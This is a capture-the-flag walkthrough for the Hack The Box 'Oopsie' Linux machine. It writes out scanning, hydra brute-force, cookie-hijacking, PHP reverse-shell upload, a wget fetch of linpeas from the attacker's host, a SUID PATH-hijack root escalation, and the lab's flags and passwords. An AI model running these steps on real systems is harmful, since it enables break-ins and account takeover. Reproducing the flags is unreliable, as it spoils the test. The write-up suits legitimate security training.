# Oopsie 

> Ver Easy | Linux 

<br>

### Process:

1. port scan:
	- `sudo nmap -T4 -p- 10.10.10.28` 
	- `sudo nmap -T4 -A -p 22,80 10.10.10.28` 
2. enumerate port 22:
	- try anonymous connection - failed
	- read banner = SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
3. enumerate port 80:
	- visit website `http://10.10.10.28`
		- found "admin" username
	- run gobuster: `gobuster dir -u http://10.10.10.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,conf,txt`
	- check for robots.txt - none 
	- run nikto scan: `nikto -h 10.10.10.28`
		- found "/cdn-cgi/login/" page
	- inspect source code 
	- run gobuster against "/cdn-cgi" directory 
	- run gobuster against "/cdn-cgi/login" directory 
4. try to brute force admin login:
	- web login with hydra: `hydra 10.10.10.28 http-post-form "/cdn-cgi/login/login.php:username=^USER^&password=^PASS^:Log in" -l admin -
P /usr/share/wordlists/rockyou.txt -f -V` -- failed
	- SSH login with hydra: `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.28 -T4` -- failed
5. used admin credentials found on last box [[achetype]]:
	- "admin:MEGACORP_4dm1n!!" -- sucess
6. check out Uploads tab:
	- need to be super admin to upload files
7. inspect Account tab:
	- displays access ID, name, and email
	- found admin account with cookies:
		- user: 34322
		- role: admin
	- these cookies values correspond with values in Accounts table 
	- try to find super admin account:
		- send request to Burp intruder
		-  select the "id" parameter
		-  set a Numbers type payload and enumerate from 1 to 100 with a step of 1
	- found super admin at `http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=30`
	- hijack cookie values:
		- user: 86575
		- role: super admin
	- can now upload files
8. try to upload PHP reverse shell:
	- download shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
	- make changes and upload with hijacked cookies on `http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads&action=upload` page
	- then setup listener and navigate to `http://10.10.10.28/uploads/r.php` to execute ("r.php" is the name of the PHP reverse shell)
9. get user flag:
	- `cd /home/robert` -> `cat user.txt`
	- user flag = **f2c74ee8db7983851ab2a96a44eb7981**
10. get root flag:
	- stablise shell: `python3 -c 'import pty;pty.spawn("/bin/sh")'` -> `bash -i`
	- esclate privileges:
		- upload linpeas: `cd /var/tmp && wget http://10.10.14.93:8080/linpeas.sh`
		- run linpeas: `chmod +x linpeas.sh && ./linpeas.sh`
	- check the "db.php" file already found when enumerating website (for credentials)
		- found "robert:M3g4C0rpUs3r!"
	- login as robert: `su robert` -> [password]
	- find out what groups robert is apart of: `id`
		- "bugtracker" group
		- find bugtracker binary: `find / -type -f -group bugtracker 2> /dev/null`
		- has SUID bit set to run as root 
	- find out what program does when run: `/usr/bin/bugtracker` -- report bugs based on user provided ID
	- find out how it does this with strings: `strings /usr/bin/bugtracker`
		- calls the `cat` binary with a relative path (rather than absolute)
		- so can add a malicious cat program to call by chaging the PATH
	- exploit "bugtracker":
		- a) change PATH to add current directory first: `export PATH=/tmp:$PATH`
		- b) create a malicious "cat" binary that will be called: `cd /tmp && echo '/bin/bash' > cat && chmod +x cat`
		- c) run bugtracker: `/usr/bin/bugtracker`
	- get root flag:
		- `/bin/cat /root/root.txt`
		- root flag = **af13b0bee69f8a877c3faf667f7beacf**
11. post-exploitation:
	- in "/root/.config/filezilla" found FTP credentials in plaintext
	- "ftpuser:mc@F1l3ZilL4"

	
	
